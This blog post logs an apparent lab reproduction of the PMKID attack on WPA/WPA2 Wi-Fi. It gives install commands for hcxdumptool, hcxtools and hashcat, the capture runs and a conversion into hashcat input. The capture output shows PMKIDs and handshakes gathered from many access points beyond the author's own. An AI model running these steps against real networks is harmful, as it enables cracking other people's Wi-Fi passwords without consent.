---
title: "Attacking WPA/WPA2 Using PMKID"
date: 2019-04-23T20:33:58-05:00
draft: false
feature_image: "/images/baby.jpg"
---

Having heard about the new attack on WPA/WPA2 using PMKID I am
attempting to reproduce.

I am using a raspberrypy with an Alfa wireless card. The AP is a tplink
N600. Also installed on system76 Ubuntu18 The first thing I did was
clone the repos.

Tools
=====

Hcxdumptool
-----------

```bash
git clone https://github.com/ZerBea/hcxdumptool.git
```

```bash
cd hcxdumptool/
```

```bash
make
```

```bash
sudo make install
```

Hcxtools
--------

```bash
git clone https://github.com/ZerBea/hcxtools.git
```

```bash
cd hcxtools/
```

```bash
sudo apt-get install libcurl4-openssl-dev libssl-dev zlib1g-dev libpcap-dev
```

```bash
make
```

```bash
sudo make install
```

Hashcat
-------

```bash
git clone https://github.com/hashcat/hashcat.git
```

or

note: did not seam to work in pi and for pi it was hashcat-data

```bash
sudo apt install hashcat
```

Attack
======

I started as in the wright up

```bash
yojimbo@system76:~/lab/oscp/hcxtools$ sudo hcxdumptool -o test.pcapng -i wlan0mon --enable_status
hcxdumptool: option '--enable_status' requires an argument
invalid argument specified
```

This is a little anoying.

Taking a guess here but enable status seams like a yes or no kind of
thing so I tried the following.

```bash
yojimbo@system76:~/lab/oscp/hcxtools$ sudo hcxdumptool -o test.pcapng -i wlan0mon --enable_status true

start capturing (stop with ctrl+c)
INTERFACE:...............: wlan0mon
FILTERLIST...............: 0 entries
MAC CLIENT...............: fcc2337c1adb (client)
MAC ACCESS POINT.........: 002067c2943f (start NIC)
EAPOL TIMEOUT............: 150000
REPLAYCOUNT..............: 65253
ANONCE...................: dcd78685e6279f9e9b1d1c391b93d59470186e77efde4b1c54853634a4bb4701

```

Cool! Now this what I expected to see. The documentation now says that I
should see \"FOUND PMKID\" if the AP supports it and it might take a
while.

> We recommend running hcxdumptool up to 10 minutes before aborting.

Ran again

```bash
yojimbo@system76:~/lab/oscp$ sudo hcxdumptool -i wlan0mon -o test.pcapng --enable_status true

start capturing (stop with ctrl+c)
INTERFACE:...............: wlan0mon
FILTERLIST...............: 0 entries
MAC CLIENT...............: fcc233a369c4 (client)
MAC ACCESS POINT.........: 3cb87ae4ab08 (start NIC)
EAPOL TIMEOUT............: 150000
REPLAYCOUNT..............: 63761
ANONCE...................: 04a1fee32ae5ceeb4e944631c12bf25d95a465615995018c769f19c373f07577

```

Here I noticed the MAC ACCESS POINT has changed. There must be a way to
set the AP MAC.

```bash
yojimbo@system76:~$ sudo hcxdumptool --help
[sudo] password for yojimbo: 
hcxdumptool 4.2.1 (C) 2018 ZeroBeat
usage  : hcxdumptool <options>
example: hcxdumptool -o output.pcapng -i wlp39s0f3u4u5 -t 5 --enable_status

options:
-i <interface> : interface (monitor mode must be enabled)
                 ip link set <interface> down
                 iw dev <interface> set type monitor
                 ip link set <interface> up
-o <dump file> : output file in pcapngformat
                 management frames and EAP/EAPOL frames
                 including radiotap header (LINKTYPE_IEEE802_11_RADIOTAP)
-O <dump file> : output file in pcapngformat
                 unencrypted IPv4 and IPv6 frames
                 including radiotap header (LINKTYPE_IEEE802_11_RADIOTAP)
-W <dump file> : output file in pcapngformat
                 encrypted WEP frames
                 including radiotap header (LINKTYPE_IEEE802_11_RADIOTAP)
-c <digit>     : set scanlist  (1,2,3,...)
                 default scanlist: 1, 3, 5, 7, 9, 11, 13, 2, 4, 6, 8, 10, 12
                 maximum entries: 127
                 allowed channels:
                 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14
                 34, 36, 38, 40, 42, 44, 46, 48, 52, 56, 58, 60, 62, 64
                 100, 104, 108, 112, 116, 120, 124, 128, 132,
                 136, 140, 144, 147, 149, 151, 153, 155, 157
                 161, 165, 167, 169, 184, 188, 192, 196, 200, 204, 208, 212, 216
-t <seconds>   : stay time on channel before hopping to the next channel
                 default: 5 seconds
-E <digit>     : EAPOL timeout
                 default: 150000 = 1 second
                 value depends on channel assignment
-D <digit>     : deauthentication interval
                 default: 10 (every 10 beacons)
                 the target beacon interval is used as trigger
-A <digit>     : ap attack interval
                 default: 10 (every 10 beacons)
                 the target beacon interval is used as trigger
-I             : show suitable wlan interfaces and quit
-h             : show this help
-v             : show version

--filterlist=<file>                : mac filter list
                                     format: 112233445566 + comment
                                     maximum line lenght 128, maximum entries 32
--filtermode=<digit>               : mode for filter list
                                     1: use filter list as protection list (default)
                                     2: use filter list as target list
--disable_active_scan              : do not transmit proberequests to BROADCAST using a BROADCAST ESSID
                                     do not transmit BROADCAST beacons
                                     affected: ap-less and client-less attacks
--disable_deauthentications        : disable transmitting deauthentications
                                     affected: connections between client an access point
                                     deauthentication attacks will not work against protected management frames
--give_up_deauthentications=<digit>: disable transmitting deauthentications after n tries
                                     default: 100 tries (minimum: 4)
                                     affected: connections between client an access point
                                     deauthentication attacks will not work against protected management frames
--disable_disassociations          : disable transmitting disassociations
                                     affected: retry (EAPOL 4/4 - M4) attack
--disable_ap_attacks               : disable attacks on single access points
                                     affected: client-less (PMKID) attack
--give_up_ap_attacks=<digit>       : disable transmitting directed proberequests after n tries
                                     default: 100 tries (minimum: 4)
                                     affected: client-less attack
                                     deauthentication attacks will not work against protected management frames
--disable_client_attacks           : disable attacks on single clients
                                     affected: ap-less (EAPOL 2/4 - M2) attack
--do_rcascan                       : show radio channel assignment (scan for target access points)
                                     you should disable auto scrolling in your terminal settings
--save_rcascan=<file>              : output rca scan list to file when hcxdumptool terminated
--save_rcascan_raw=<file>          : output file in pcapngformat
                                     unfiltered packets
                                     including radiotap header (LINKTYPE_IEEE802_11_RADIOTAP)
--enable_status=<digit>            : enable status messages
                                     bitmask:
                                     1: EAPOL
                                     2: PROBEREQUEST/PROBERESPONSE
                                     4: AUTHENTICATON
                                     8: ASSOCIATION
--help                             : show this help
--version                          : show version

```

I figured it out

```bash
pi@raspberrypi:~ $ sudo hcxdumptool -i wlan0mon -o test.pcapng --enable_status 1

start capturing (stop with ctrl+c)
INTERFACE:...............: wlan0mon
FILTERLIST...............: 0 entries
MAC CLIENT...............: fcc23344943a (client)
MAC ACCESS POINT.........: 00182555bc46 (start NIC)
EAPOL TIMEOUT............: 150000
REPLAYCOUNT..............: 65152
ANONCE...................: e635323d909d8b276972d7c679395d5e088b0c2fe9068f660d75c53699477980

[20:32:34 - 001] ac5d10006b96 -> 000d4ba0fbfd [FOUND PMKID]
[20:32:34 - 001] ac5d10006b96 -> 000d4ba0fbfd [FOUND AUTHORIZED HANDSHAKE, EAPOL TIMEOUT 24559]
[20:32:35 - 001] 40b03473c8e0 -> 346b4648bc2a [EAPOL 4/4 - M4 RETRY ATTACK]
[20:32:35 - 001] b42a0e0f488b -> fcc23344943a [FOUND PMKID CLIENT-LESS]
[20:32:37 - 001] 289efc618a66 -> fcc23344943a [FOUND PMKID CLIENT-LESS]
[20:32:37 - 001] 1cc63c1d9277 -> 28187849d4fd [FOUND PMKID]
[20:32:48 - 005] 90489aeae9a3 -> fcc23344943a [FOUND PMKID CLIENT-LESS]
[20:32:59 - 011] f82c182e4816 -> fcc23344943a [FOUND PMKID CLIENT-LESS]
[20:33:03 - 011] 94c1500c0e9e -> 2c3068e4dba1 [FOUND PMKID]
[20:33:03 - 011] 94c1500c0e9e -> 2c3068e4dba1 [FOUND AUTHORIZED HANDSHAKE, EAPOL TIMEOUT 21588]
[20:33:21 - 006] 9c3dcf96791b -> 88dea96707e5 [FOUND PMKID]
[20:33:21 - 006] 9c3dcf96791b -> 6837e9903faa [FOUND PMKID]
[20:33:21 - 006] 9c3dcf96791b -> 88dea96707e5 [FOUND AUTHORIZED HANDSHAKE, EAPOL TIMEOUT 13277]
[20:33:22 - 006] 1c1b68790ed0 -> fcc23344943a [FOUND PMKID CLIENT-LESS]
[20:33:23 - 006] 14edbbb260fa -> fcc23344943a [FOUND PMKID CLIENT-LESS]
[20:33:24 - 006] 9c3dcf96791b -> fcc23344943a [FOUND PMKID CLIENT-LESS]

```

```bash
pi@raspberrypi:~ $ sudo hcxpcaptool -z test.16800 test.pcapng
start reading from test.pcapng

summary:                                        
--------
file name....................: test.pcapng
file type....................: pcapng 1.0
file hardware information....: armv6l
file os information..........: Linux 4.14.52+
file application information.: hcxdumptool 4.2.1
network type.................: DLT_IEEE802_11_RADIO (127)
endianess....................: little endian
read errors..................: flawless
packets inside...............: 4644
skipped packets..............: 0
packets with FCS.............: 0
beacons (with ESSID inside)..: 17
probe requests...............: 8
probe responses..............: 24
association requests.........: 857
association responses........: 1723
reassociation requests.......: 2
reassociation responses......: 1
authentications (OPEN SYSTEM): 1255
authentications (BROADCOM)...: 1255
EAPOL packets................: 756
EAPOL PMKIDs.................: 13
best handshakes..............: 6 (ap-less: 1)

13 PMKID(s) written to test.16800

```

> Note: While not required it is recommended to use options -E -I and -U
> with hcxpcaptool. We can use these files to feed hashcat. They
> typically produce good results. -E retrieve possible passwords from
> WiFi-traffic (additional, this list will include ESSIDs) -I retrieve
> identities from WiFi-traffic -U retrieve usernames from WiFi-traffic

> pi\@raspberrypi:\~ \$ sudo hcxpcaptool -E essidlist -I identitylist -U
> usernamelist -z test.16800 test.pcapng start reading from test.pcapng
>
> summary:
>
> ------------------------------------------------------------------------
>
> file name....................: test.pcapng file
> type....................: pcapng 1.0 file hardware information....:
> armv6l file os information..........: Linux 4.14.52+ file application
> information.: hcxdumptool 4.2.1 network type.................:
> DLT~IEEE80211RADIO~ (127) endianess....................: little endian
> read errors..................: flawless packets inside...............:
> 4644 skipped packets..............: 0 packets with FCS.............: 0
> beacons (with ESSID inside)..: 17 probe requests...............: 8
> probe responses..............: 24 association requests.........: 857
> association responses........: 1723 reassociation requests.......: 2
> reassociation responses......: 1 authentications (OPEN SYSTEM): 1255
> authentications (BROADCOM)...: 1255 EAPOL packets................: 756
> EAPOL PMKIDs.................: 13 best handshakes..............: 6
> (ap-less: 1)
>
> 13 PMKID(s) written to test.16800

<https://hashcat.net/forum/thread-7717.html>
